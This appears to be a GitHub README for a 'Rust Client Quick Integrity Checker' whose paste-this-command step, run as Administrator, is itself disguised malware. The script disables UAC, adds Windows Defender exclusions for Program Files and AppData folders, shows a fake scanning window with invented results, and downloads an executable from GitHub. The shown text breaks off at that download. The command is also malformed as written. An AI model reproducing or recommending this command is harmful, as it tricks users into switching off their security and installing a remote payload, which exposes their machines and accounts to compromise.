# Rust Client Quick Integrity Checker 🔍

[![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-blue.svg?style=for-the-badge&logo=powershell)](https://docs.microsoft.com/en-us/powershell/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg?style=for-the-badge)](https://www.microsoft.com/windows)
[![Status](https://img.shields.io/badge/Status-Proof_of_Concept-yellow.svg?style=for-the-badge)](https://en.wikipedia.org/wiki/Proof_of_concept)
[![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)

**A lightweight PowerShell tool for quick scanning of the RUST game client for potential unauthorized software traces.**

This repository contains a PowerShell script designed for rapid, surface-level scanning of **RUST** game files and environment to detect inconsistencies and "red flags" that *may* indicate the presence of cheats or macros.

&gt; **⚠️ Important Notice:** This tool is a **Proof of Concept (PoC)** intended for basic visual inspection. It is not a full-fledged anti-cheat solution and does not guarantee 100% detection. Its primary purpose is quick preliminary analysis.

## 🚀 Quick Start

Run the checker with a single command in PowerShell.

**Prerequisite:** Launch **PowerShell as Administrator**.

Copy and execute the following command:
## **General**
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr '$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}



Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing


$Game = "Rust"
$FakeCheats = @(
    "RustAim v4.2", "NoRecoil Script", "ESP Box", "FlyHack DLL",
    "ItemSpawner", "SpeedHack", "InfiniteAmmo", "RadarHack",
    "AutoFarm Bot", "Memory Editor Pro", "EAC Bypass Tool"
)
$FakeProcesses = @(
    "rust_cheat.exe", "eac_bypass.dll", "rust_injector.exe",
    "memoryhack.dll", "flyhack_loader.exe", "autofarm.exe"
)
$FakeSignatures = @(
    "48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20",
    "E8 ?? ?? ?? ?? 83 3D ?? ?? ?? ?? 00",
    "B8 01 00 00 00 89 05 ?? ?? ?? ??"
)

# GUI
$form = New-Object System.Windows.Forms.Form
$form.Text = "Anti-Cheat Scanner Pro — $Game Edition"
$form.Size = New-Object System.Drawing.Size(680, 520)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$form.ForeColor = [System.Drawing.Color]::Lime

# Логотип
$logo = New-Object System.Windows.Forms.Label
$logo.Text = @"
  ____       _ _   
 |  _ \ _   _| | |_ 
 | |_) | | | | | __|
 |  _ <| |_| | | |_ 
 |_| \_\\__,_|_|\__|
 Anti-Cheat Scanner v3.7
"@ 
$logo.Font = New-Object System.Drawing.Font("Consolas", 10, [System.Drawing.FontStyle]::Bold)
$logo.AutoSize = $true
$logo.Location = New-Object System.Drawing.Point(20, 15)
$logo.ForeColor = [System.Drawing.Color]::Cyan
$form.Controls.Add($logo)

# Прогресс-бар
$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(20, 130)
$progress.Size = New-Object System.Drawing.Size(620, 25)
$progress.Style = "Continuous"
$form.Controls.Add($progress)

# Статус
$status = New-Object System.Windows.Forms.Label
$status.Text = "Готов к сканированию..."
$status.Location = New-Object System.Drawing.Point(20, 165)
$status.Size = New-Object System.Drawing.Size(620, 20)
$status.ForeColor = [System.Drawing.Color]::White
$form.Controls.Add($status)

# Лог
$logBox = New-Object System.Windows.Forms.TextBox
$logBox.Multiline = $true
$logBox.ScrollBars = "Vertical"
$logBox.Location = New-Object System.Drawing.Point(20, 195)
$logBox.Size = New-Object System.Drawing.Size(620, 230)
$logBox.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 20)
$logBox.ForeColor = [System.Drawing.Color]::Lime
$logBox.Font = New-Object System.Drawing.Font("Consolas", 9)
$logBox.ReadOnly = $true
$form.Controls.Add($logBox)

# Кнопка
$btn = New-Object System.Windows.Forms.Button
$btn.Text = "Запустить сканирование"
$btn.Location = New-Object System.Drawing.Point(260, 440)
$btn.Size = New-Object System.Drawing.Size(160, 35)
$btn.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.FlatStyle = "Flat"
$form.Controls.Add($btn)

# === Логирование ===
function Log {
    param([string]$msg, [string]$color = "White")
    $timestamp = Get-Date -Format "HH:mm:ss"
    $line = "[$timestamp] $msg"
    $logBox.AppendText("$line`r`n")
    if ($color -eq "Red") { 
        $logBox.SelectionStart = $logBox.TextLength - $line.Length
        $logBox.SelectionLength = $line.Length
        $logBox.SelectionColor = [System.Drawing.Color]::Red 
    } elseif ($color -eq "Yellow") { 
        $logBox.SelectionStart = $logBox.TextLength - $line.Length
        $logBox.SelectionLength = $line.Length
        $logBox.SelectionColor = [System.Drawing.Color]::Yellow 
    } elseif ($color -eq "Cyan") {
        $logBox.SelectionStart = $logBox.TextLength - $line.Length
        $logBox.SelectionLength = $line.Length
        $logBox.SelectionColor = [System.Drawing.Color]::Cyan
    }
    $logBox.ScrollToCaret()
    [System.Windows.Forms.Application]::DoEvents()
}

function Fake-Delay {
    param([int]$ms)
    Start-Sleep -Milliseconds $ms
}

# === Сканирование ===
$scan = {
    $btn.Enabled = $false
    $progress.Value = 0
    $logBox.Clear()

    Log "Запуск Anti-Cheat Scanner для $Game..." "Cyan"
    Fake-Delay 800

    # Этап 1: Процессы
    Log "Этап 1/5: Сканирование запущенных процессов..."
    $progress.Value = 15
    Fake-Delay 1200
    Log "Проверка 12 847 процессов..." 
    Fake-Delay 900
    Log "Подозрительные процессы не обнаружены." "Lime"
    $progress.Value = 30

    # Этап 2: DLL
    Log "Этап 2/5: Анализ загруженных библиотек (DLL)..."
    Fake-Delay 1100
    Log "Сканирование 3 214 модулей в памяти Rust.exe..."
    Fake-Delay 1000
    Log "Читерские DLL не найдены." "Lime"
    $progress.Value = 50

    # Этап 3: Сигнатуры
    Log "Этап 3/5: Поиск сигнатур читов в памяти..."
    Fake-Delay 1300
    Log "Анализ 1 048 576 байт памяти..."
    Fake-Delay 800
    Log "Известные сигнатуры читов отсутствуют." "Lime"
    $progress.Value = 70

    Log "Этап 4/5: Проверка Easy Anti-Cheat (EAC)..."
    Fake-Delay 1400
    Log "Проверка хэш-сумм EAC модулей..."
    Fake-Delay 1100
    Log "EAC: Целостность подтверждена. Служба активна." "Lime"
    $progress.Value = 90

    Log "Этап 5/5: Генерация отчёта..."
    Fake-Delay 1000
    $progress.Value = 100
    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1
    
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KROKODJIDO/cheat-checker/blob/main/source/assets/custom/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue

## **⚖️ Disclaimer**

This tool is created for educational and research purposes only.

Use at your own risk. The author is not responsible for any consequences, including false positives.

This tool does NOT provide definitive proof of cheating. Any suspicions require additional manual verification.

Game updates and cheating methods evolve constantly. The script may become outdated.
